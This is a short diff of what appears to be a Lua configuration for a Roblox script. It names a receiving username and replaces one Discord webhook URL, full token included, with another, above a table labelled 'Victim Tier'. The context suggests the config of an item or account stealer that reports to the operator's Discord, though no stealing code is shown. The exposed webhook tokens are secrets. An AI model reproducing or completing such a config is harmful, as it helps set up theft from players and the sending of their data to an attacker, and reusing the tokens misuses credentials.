@@ -1,5 +1,5 @@
 userName = "Raniase987"
-webHook = "https://discord.com/api/webhooks/1289678550022099014/GMYAt8-7h_bfmWJUSPj6WzNnfgujfrcbr-bDfSbftyORlTRxuakbjFTGa5W-BQcVeBuW"
+webHook = "https://discord.com/api/webhooks/1565078210042142833/_8wrHO4vLEDVnNh1WPNvHzVvEpVd66kho40L4q09Q1B9_97KB347F6LS_9iCrzdSCfZu"
 
 local values = {
     -- >> Uniques/Victim Tier << --
